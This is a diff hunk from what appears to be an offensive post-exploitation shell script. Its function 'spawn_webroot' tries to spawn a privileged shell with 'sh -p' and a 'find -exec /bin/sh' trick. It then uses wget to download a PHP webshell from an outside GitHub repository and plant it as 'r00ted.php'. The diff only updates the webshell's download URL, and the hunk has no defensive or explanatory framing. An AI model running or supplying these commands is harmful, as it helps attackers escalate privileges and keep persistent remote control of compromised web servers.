@@ -124,7 +124,7 @@ spawn_webroot(){
 	sh -p
 	echo -ne "$ijo[+] Trying spawn using Find...$rampung\n"
 	touch .,; find ., -exec /bin/sh \;
-	wget https://raw.githubusercontent.com/ortod0x/rootkitninja_webshell/main/rootkitninja.php -O $curr_dir/r00ted.php
+	wget https://github.com/Rootkit-Ninja/webshell/raw/main/php/rootkitninja.php -O $curr_dir/r00ted.php
 	echo -ne "Rooted Shell Spawned in $curr_dir/r00ted.php"
 }
 
